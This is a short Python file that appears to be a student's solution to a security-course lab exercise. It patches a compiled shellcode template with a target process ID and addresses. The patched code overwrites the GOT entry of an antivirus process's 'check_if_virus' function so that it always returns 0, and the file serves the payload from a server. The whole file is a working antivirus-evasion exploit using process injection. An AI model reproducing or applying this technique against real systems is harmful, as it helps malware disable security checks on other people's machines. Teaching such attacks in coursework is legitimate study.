import addresses
import evasion
import struct

class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
        # open to read in binary mode
        template_file = open(PATH_TO_TEMPLATE, "rb") 
        template = template_file.read()
        template_file.close()

        pid_loc = template.find(struct.pack("<I", 0x01234567))
        GOT_loc = template.find(struct.pack("<I", 0x89abcdef))
        func_loc= template.find(struct.pack("<I", 0x01230123))

        

        shellcode = template[:pid_loc] + struct.pack("<I", pid) + template[pid_loc+4:GOT_loc] + struct.pack("<I", addresses.CHECK_IF_VIRUS_GOT) + template[GOT_loc+4:func_loc] + struct.pack("<I", addresses.CHECK_IF_VIRUS_ALTERNATIVE) + template[func_loc+4:]

        return shellcode

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
